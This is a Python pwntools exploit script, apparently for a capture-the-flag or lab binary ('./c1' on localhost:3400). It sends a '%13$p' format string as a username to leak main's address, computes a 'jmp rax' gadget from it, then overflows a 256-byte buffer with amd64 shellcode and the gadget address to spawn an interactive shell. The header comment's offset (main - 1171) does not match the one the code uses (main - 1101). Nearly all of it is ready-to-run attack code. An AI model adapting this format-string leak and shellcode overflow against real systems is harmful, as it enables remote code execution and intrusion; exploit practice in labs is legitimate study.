# %13$p - > leaking main address
# address of gadget = 0x000000000040113c: jmp rax;
# offset to the gadget = main - 1171

from pwn import *


context.log_level = 'debug'
context.arch = 'amd64'
BINARY = "./c1"

if args.LOCAL:
    r = process(BINARY)
else:
    #r = process(BINARY)
    r = remote("localhost", 3400)

e = ELF(BINARY)
shell_code = asm(shellcraft.amd64.sh())

# ret = ROP(e).find_gadget(['ret'])[0]  

gdb_script = """
b *send_letter+75
"""

def register():
    print("[*] Registering...")
    r.sendline("1")
    print("[*] Sending username...")
    print(r.recv().decode())
    r.sendline("%13$p")
    # print(r.recv().decode())

def login():
    print("[*] Logging in...")
    r.sendline("2")
    r.recvuntil(b"Enter username to login:")
    r.sendline("%13$p")
    # print(r.recv().decode())

def get_leak():
    print("[*] Getting leak...")
    r.sendline("3")
    r.recv()
    profile = r.recv()
    print("Profile: ",profile)
    main_leak = int(profile.decode().split("Username: ")[1].split("\n")[0], 16)
    print("[*] Main leak:", hex(main_leak))
    gadget_leak = main_leak - 1101
    print("[*] Gadget leak:", hex(gadget_leak))
    return gadget_leak



try:
    # gdb.attach(r,gdb_script)
    output = r.recvuntil(b"Exit\n>")
    print(output.decode())
    register()
    print(r.recv().decode())
    login()
    print(r.recv().decode())
    gadget_address = get_leak()
    # print(r.recv().decode())
    r.sendline("4")
    print(r.recv().decode())

    payload = flat(shell_code, 'A' * (256 - len(shell_code)), 'B'*8, p64(gadget_address))
    r.sendline(payload)
    r.interactive()

except Exception as e:
    print(f"[-] Error: {str(e)}")

finally:
    r.close()